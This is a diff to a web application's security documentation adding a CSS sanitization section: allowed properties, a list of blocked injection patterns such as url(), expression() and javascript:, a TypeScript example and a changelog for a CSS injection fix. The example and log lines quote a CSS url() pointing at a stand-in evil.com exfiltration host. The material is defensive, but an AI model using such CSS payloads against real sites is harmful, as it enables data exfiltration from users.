@@ -294,21 +294,123 @@ If you discover a way to bypass the sanitization or have security concerns:
 2. **Contact the development team** - Use the security disclosure process
 3. **Provide details** - Include steps to reproduce and potential impact
 
+## CSS Sanitization
+
+### Overview
+
+User-provided CSS styles are sanitized to prevent CSS injection attacks, data exfiltration, and UI redressing. The CSS sanitizer uses a whitelist approach, allowing only safe CSS properties and blocking dangerous patterns.
+
+### Allowed CSS Properties
+
+Only the following CSS properties are permitted in user-defined styles:
+
+#### Layout & Display
+- `display`, `position`, `top`, `right`, `bottom`, `left`, `z-index`
+
+#### Flexbox
+- `flex`, `flex-direction`, `flex-wrap`, `flex-flow`, `flex-grow`, `flex-shrink`, `flex-basis`
+- `justify-content`, `align-items`, `align-content`, `align-self`, `order`
+
+#### Grid
+- `grid`, `grid-template`, `grid-template-columns`, `grid-template-rows`, `grid-template-areas`
+- `grid-auto-columns`, `grid-auto-rows`, `grid-auto-flow`
+- `grid-column`, `grid-row`, `grid-area`
+- `gap`, `row-gap`, `column-gap`
+
+#### Sizing
+- `width`, `height`, `min-width`, `min-height`, `max-width`, `max-height`
+
+#### Spacing
+- `margin`, `margin-top`, `margin-right`, `margin-bottom`, `margin-left`
+- `padding`, `padding-top`, `padding-right`, `padding-bottom`, `padding-left`
+
+#### Typography
+- `color`, `font`, `font-family`, `font-size`, `font-weight`, `font-style`, `font-variant`
+- `line-height`, `letter-spacing`, `word-spacing`
+- `text-align`, `text-decoration`, `text-transform`, `text-indent`
+- `white-space`, `word-wrap`, `word-break`, `overflow-wrap`
+
+#### Borders
+- `border` and all variants (`border-width`, `border-style`, `border-color`, etc.)
+- `border-radius` and corner-specific variants
+
+#### Background
+- `background-color` **only** (background images are **not** permitted)
+
+#### Visual Effects
+- `opacity`, `visibility`, `overflow`, `overflow-x`, `overflow-y`, `cursor`
+
+#### Transform (Limited)
+- `transform`, `transform-origin`
+
+### Blocked CSS Patterns
+
+The following patterns are automatically blocked in CSS values:
+
+- `url()` - Can be used for data exfiltration
+- `@import` - Can load external stylesheets
+- `expression()` - IE-specific JavaScript execution
+- `javascript:` - JavaScript protocol
+- `data:` - Data URIs (can contain scripts)
+- `vbscript:` - VBScript protocol
+- `<script` - Script tags
+- Event handlers - `onclick=`, `onerror=`, etc.
+- Unicode escapes - Can bypass filters
+- HTML entities - Can bypass filters
+- Excessively long values (>1000 characters)
+
+### Using CSS Sanitization
+
+The CSS sanitizer is automatically applied to all user-defined styles in:
+
+1. **Layout Container Styles** - Custom styles on groups, grids, columns
+2. **Static Content Styles** - Inline styles on static HTML elements
+3. **Color Field Values** - Background colors in color pickers and swatches
+4. **Resource Bar Styles** - Custom colors for progress bars
+
+**Example:**
+```typescript
+import { sanitizeStyles } from '$lib/utils/cssSanitizer';
+
+// Sanitize a style object
+const userStyles = {
+  color: 'red',
+  'font-size': '16px',
+  'background-image': 'url(http://evil.com/exfiltrate)' // Removed by sanitizer
+};
+
+// Returns: "color: red; font-size: 16px"
+const safeStyles = sanitizeStyles(userStyles);
+```
+
+### CSS Security Warnings
+
+The sanitizer logs warnings to the console when it blocks dangerous content:
+
+```
+[CSS Sanitizer] Blocked disallowed property: background-image
+[CSS Sanitizer] Blocked dangerous pattern in color: url(http://evil.com)
+[CSS Sanitizer] Blocked excessively long value in width
+```
+
+These warnings help identify potential attack attempts or misconfigured forms.
+
 ## Technical Details
 
 ### Implementation
 
 The sanitization is implemented using:
 
-- **Library:** isomorphic-dompurify v2.34.0+
+- **HTML Library:** isomorphic-dompurify v2.34.0+
+- **CSS Library:** Custom whitelist-based sanitizer
 - **Configuration:** Whitelist-based (allow known-good, block everything else)
 - **Scope:** Client-side and server-side rendering
 
 ### Files Involved
 
-- `apps/web/src/lib/components/forms/LayoutRenderer.svelte` - Static HTML sanitization
-- `apps/web/src/lib/components/forms/FieldRenderer.svelte` - Rich text sanitization
-- `apps/web/src/lib/services/cssSanitizer.ts` - CSS sanitization (separate system)
+- `apps/web/src/lib/utils/cssSanitizer.ts` - CSS sanitization implementation and tests
+- `apps/web/src/lib/components/forms/LayoutRenderer.svelte` - Static HTML and CSS sanitization
+- `apps/web/src/lib/components/forms/FieldRenderer.svelte` - Rich text and field-specific CSS sanitization
 
 ### Sanitization Configuration
 
@@ -494,6 +596,17 @@ Test files: `apps/web/tests/computedFieldEngine.limits.test.ts`
 
 ## Changelog
 
+### 2025-12-12 - CSS Injection Vulnerability Fix (MEDIUM Severity)
+
+- **Security Fix**: Implemented comprehensive CSS sanitization to prevent CSS injection attacks
+- Created `apps/web/src/lib/utils/cssSanitizer.ts` with whitelist-based property filtering
+- Added CSS sanitization to `LayoutRenderer.svelte` for all layout containers (group, grid, columns, static)
+- Added CSS sanitization to `FieldRenderer.svelte` for color fields and resource bars
+- Blocked dangerous CSS patterns: `url()`, `expression()`, `javascript:`, `data:`, etc.
+- Created comprehensive test suite with 30+ test cases
+- Added security warnings for blocked content attempts
+- **Status**: ✅ All tests passing, TypeScript build successful
+
 ### 2025-12-12 - Formula Security Limits
 
 - Added maximum formula length limit (10,000 characters)
@@ -515,4 +628,4 @@ Test files: `apps/web/tests/computedFieldEngine.limits.test.ts`
 ---
 
 **Last Updated:** 2025-12-12
-**Version:** 1.1.0
+**Version:** 1.2.0
